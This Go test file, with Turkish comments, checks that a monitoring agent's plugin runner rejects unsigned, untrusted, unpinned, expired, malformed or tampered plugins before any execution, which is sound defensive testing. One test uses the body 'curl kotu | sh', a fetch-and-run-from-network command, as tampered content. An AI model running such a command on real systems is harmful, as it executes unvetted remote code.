package eklentiajan

// Red testleri (730 §B.1 kabulü, 680 saldiri_test kalıbı): her biri bir
// saldırgan yeteneğini (panel ele geçmiş, anahtar sızmış, eski içerik) temsil
// eder ve eklentinin ÇALIŞMADIĞINI (yürütücü çağrılmadan) doğrular.

import (
	"bytes"
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/kadirsungurlu/bekci/internal/eklenti"
)

var testNow = time.Unix(1_800_000_000, 0)

const testBody = "echo 'OK - yuk %d | load=0.5;1;2'\n"

type fixture struct {
	t    *testing.T
	pub  ed25519.PublicKey
	priv ed25519.PrivateKey
	p    Paths
	body []byte
}

func newFixture(t *testing.T) *fixture {
	t.Helper()
	pub, priv, _ := ed25519.GenerateKey(rand.Reader)
	d := t.TempDir()
	f := &fixture{t: t, pub: pub, priv: priv, body: []byte(testBody),
		p: Paths{Config: filepath.Join(d, "etc", "eklenti.json"), LogDir: filepath.Join(d, "log")}}
	return f
}

func (f *fixture) manifest(mod func(m map[string]any)) map[string]any {
	m := map[string]any{
		"schema": 1, "id": "yuk", "version": 3, "sha256": Digest(f.body), "interpreter": "sh",
		"mode": "periodic", "class": "metric", "run_as": "nobody", "platforms": []string{"linux"},
		"interval_min": 60, "interval_max": 3600, "timeout_sec": 10, "output": "nagios", "network": false,
		"not_before": testNow.Add(-time.Hour).Unix(), "not_after": testNow.Add(30 * 24 * time.Hour).Unix(),
	}
	if mod != nil {
		mod(m)
	}
	return m
}

func (f *fixture) item(m map[string]any, signer ed25519.PrivateKey, interval int) Item {
	payload, _ := json.Marshal(m)
	env := SignManifest(signer, payload)
	return Item{Name: "yuk", Source: "plugin", Interval: interval, Manifest: env,
		Body: base64.StdEncoding.EncodeToString(f.body)}
}

func (f *fixture) config(pin string) {
	c := &Config{Trust: []string{base64.StdEncoding.EncodeToString(f.pub)}}
	if pin != "" {
		c.SetPin("yuk", pin)
	}
	if err := SaveConfig(f.p.Config, c); err != nil {
		f.t.Fatal(err)
	}
}

type fakeExec struct {
	calls atomic.Int32
	last  Spec
	out   Outcome
}

func (e *fakeExec) Run(_ context.Context, s Spec) Outcome {
	e.calls.Add(1)
	e.last = s
	return e.out
}

func (f *fixture) sched(ex Executor) *Scheduler {
	return &Scheduler{Paths: f.p, Exec: ex, Kayit: &DosyaKayit{Dir: f.p.LogDir}, Now: func() time.Time { return testNow }}
}

func (f *fixture) expectRed(it Item, code string) {
	f.t.Helper()
	ex := &fakeExec{}
	s := f.sched(ex)
	s.Handle(mustJSON([]Item{it}))
	r := s.RunOne(context.Background(), it)
	if r.Error != code || r.Status != eklenti.Unknown {
		f.t.Fatalf("kod %q durum %q, beklenen %q unknown (ileti %q)", r.Error, r.Status, code, r.Message)
	}
	if ex.calls.Load() != 0 {
		f.t.Fatal("reddedilen eklenti yürütücüye ulaştı")
	}
}

func mustJSON(v any) json.RawMessage { b, _ := json.Marshal(v); return b }

func TestKabul(t *testing.T) {
	f := newFixture(t)
	f.config(Digest(f.body))
	ex := &fakeExec{out: Outcome{ExitCode: 1, Stdout: []byte("WARN - yuk | load=1.5;1;2\n"), Stderr: []byte("uyarı"), Elapsed: 40 * time.Millisecond}}
	s := f.sched(ex)
	it := f.item(f.manifest(nil), f.priv, 300)
	r := s.RunOne(context.Background(), it)
	if ex.calls.Load() != 1 || r.Error != "" || r.Status != eklenti.Warning || r.Version != 3 || len(r.Metrics) != 1 || r.Stderr != "uyarı" {
		t.Fatalf("sonuç %+v", r)
	}
	if ex.last.RunAs != "nobody" || ex.last.Network || ex.last.Timeout != 10*time.Second || !bytes.Equal(ex.last.Body, f.body) ||
		!strings.HasPrefix(ex.last.Unit, UnitPrefix+"yuk-") {
		t.Fatalf("spec %+v", ex.last)
	}
}

func TestRedImzasiz(t *testing.T) {
	f := newFixture(t)
	f.config(Digest(f.body))
	it := f.item(f.manifest(nil), f.priv, 300)
	// İmza alanı bozuk (imzasız içerik).
	var w map[string]string
	json.Unmarshal(it.Manifest, &w)
	w["sig"] = base64.StdEncoding.EncodeToString(make([]byte, ed25519.SignatureSize))
	it.Manifest = mustJSON(w)
	f.expectRed(it, RedImza)
	// Zarf yok, yalnız düz manifest.
	it.Manifest = mustJSON(f.manifest(nil))
	f.expectRed(it, RedImza)
}

func TestRedGuvenilmeyenAnahtar(t *testing.T) {
	f := newFixture(t)
	f.config(Digest(f.body))
	_, other, _ := ed25519.GenerateKey(rand.Reader)
	f.expectRed(f.item(f.manifest(nil), other, 300), RedImza)
}

func TestRedIgnesiz(t *testing.T) {
	f := newFixture(t)
	f.config("")
	f.expectRed(f.item(f.manifest(nil), f.priv, 300), RedIgneYok)
}

func TestRedIgneFarkli(t *testing.T) {
	// Panel + imza anahtarı ele geçmiş: yeni içerik geçerli imzalı ama yerel
	// iğne eski gövdeyi gösteriyor.
	f := newFixture(t)
	f.config(Digest([]byte("echo eski")))
	f.expectRed(f.item(f.manifest(nil), f.priv, 300), RedIgne)
}

func TestRedGovdeDegisti(t *testing.T) {
	f := newFixture(t)
	f.config(Digest(f.body))
	it := f.item(f.manifest(nil), f.priv, 300)
	it.Body = base64.StdEncoding.EncodeToString([]byte("curl kotu | sh"))
	f.expectRed(it, RedGovde)
}

func TestRedSuresiDolmus(t *testing.T) {
	f := newFixture(t)
	f.config(Digest(f.body))
	f.expectRed(f.item(f.manifest(func(m map[string]any) {
		m["not_before"] = testNow.Add(-40 * 24 * time.Hour).Unix()
		m["not_after"] = testNow.Add(-time.Second).Unix()
	}), f.priv, 300), RedSure)
	f.expectRed(f.item(f.manifest(func(m map[string]any) {
		m["not_before"] = testNow.Add(time.Hour).Unix()
	}), f.priv, 300), RedErken)
	// D4: 180 günden uzun geçerlilik manifest hatasıdır.
	f.expectRed(f.item(f.manifest(func(m map[string]any) {
		m["not_after"] = testNow.Add(200 * 24 * time.Hour).Unix()
	}), f.priv, 300), RedManifest)
}

func TestRedAralikDisi(t *testing.T) {
	f := newFixture(t)
	f.config(Digest(f.body))
	for _, iv := range []int{59, 30, 3601, 0} {
		f.expectRed(f.item(f.manifest(nil), f.priv, iv), RedAralik)
	}
	// Manifestin kendisi 60-86400 dışında.
	for _, mod := range []func(map[string]any){
		func(m map[string]any) { m["interval_min"] = 10 },
		func(m map[string]any) { m["interval_max"] = 90000 },
		func(m map[string]any) { m["interval_min"], m["interval_max"] = 600, 300 },
		func(m map[string]any) { m["timeout_sec"] = 61 },
	} {
		f.expectRed(f.item(f.manifest(mod), f.priv, 300), RedManifest)
	}
}

func TestRedBilinmeyenAlan(t *testing.T) {
	// Katı ayrıştırıcı: bilinmeyen alan, eksik mode/class, 680 tek seferlik
	// manifest alanları, büyük harfli anahtar reddedilir.
	f := newFixture(t)
	f.config(Digest(f.body))
	for name, mod := range map[string]func(map[string]any){
		"bilinmeyen": func(m map[string]any) { m["read_write_paths"] = []string{"/"} },
		"680":        func(m map[string]any) { m["approval"] = "none"; m["groups"] = []string{"x"} },
		"mode":       func(m map[string]any) { m["mode"] = "once" },
		"class":      func(m map[string]any) { m["class"] = "action" },
		"modeyok":    func(m map[string]any) { delete(m, "mode") },
		"buyuk":      func(m map[string]any) { m["Network"] = true },
		"schema":     func(m map[string]any) { m["schema"] = 2 },
		"run_as":     func(m map[string]any) { m["run_as"] = "www-data" },
		"output":     func(m map[string]any) { m["output"] = "xml" },
	} {
		t.Run(name, func(t *testing.T) {
			f.t = t
			f.expectRed(f.item(f.manifest(mod), f.priv, 300), RedManifest)
		})
	}
}

func TestRedYinelenenAnahtar(t *testing.T) {
	f := newFixture(t)
	f.config(Digest(f.body))
	m := f.manifest(nil)
	payload, _ := json.Marshal(m)
	payload = bytes.Replace(payload, []byte(`"network":false`), []byte(`"network":false,"network":true`), 1)
	it := Item{Name: "yuk", Source: "plugin", Interval: 300, Manifest: SignManifest(f.priv, payload),
		Body: base64.StdEncoding.EncodeToString(f.body)}
	f.expectRed(it, RedManifest)
}

func TestRedAdUyusmuyor(t *testing.T) {
	f := newFixture(t)
	f.config(Digest(f.body))
	it := f.item(f.manifest(nil), f.priv, 300)
	it.Name = "baska"
	f.expectRed(it, RedAd)
}

func TestRedYapilandirmaYokGevsek(t *testing.T) {
	f := newFixture(t)
	f.expectRed(f.item(f.manifest(nil), f.priv, 300), RedKapali) // dosya yok
	f.config(Digest(f.body))
	os.Chmod(f.p.Config, 0o666)
	f.expectRed(f.item(f.manifest(nil), f.priv, 300), RedKapali) // herkes yazabilir
}

func TestRedPlatform(t *testing.T) {
	f := newFixture(t)
	f.config(Digest(f.body))
	s := f.sched(nil)
	r := s.RunOne(context.Background(), f.item(f.manifest(nil), f.priv, 300))
	if r.Error != RedPlatform {
		t.Fatalf("kod %q", r.Error)
	}
}

func TestIgneKaldirilincaDurur(t *testing.T) {
	f := newFixture(t)
	f.config(Digest(f.body))
	ex := &fakeExec{out: Outcome{Stdout: []byte("OK\n")}}
	s := f.sched(ex)
	it := f.item(f.manifest(nil), f.priv, 300)
	if r := s.RunOne(context.Background(), it); r.Error != "" {
		t.Fatal(r.Error)
	}
	if err := komut(f.p, []string{"kapat", "yuk"}, new(bytes.Buffer), true); err != nil {
		t.Fatal(err)
	}
	if r := s.RunOne(context.Background(), it); r.Error != RedIgneYok || ex.calls.Load() != 1 {
		t.Fatalf("kapat sonrası %q, çağrı %d", r.Error, ex.calls.Load())
	}
}

func TestZamanAsimiVeExec(t *testing.T) {
	f := newFixture(t)
	f.config(Digest(f.body))
	ex := &fakeExec{out: Outcome{ExitCode: 0, TimedOut: true, Stdout: []byte("OK | a=1\n")}}
	s := f.sched(ex)
	it := f.item(f.manifest(nil), f.priv, 300)
	if r := s.RunOne(context.Background(), it); r.Status != eklenti.Unknown || r.Error != "timeout" {
		t.Fatalf("zaman aşımı %+v", r)
	}
	ex.out = Outcome{ExitCode: -1, Err: errors.New("systemd-run yok")}
	if r := s.RunOne(context.Background(), it); r.Status != eklenti.Unknown || r.Error != "exec" {
		t.Fatalf("exec %+v", r)
	}
}
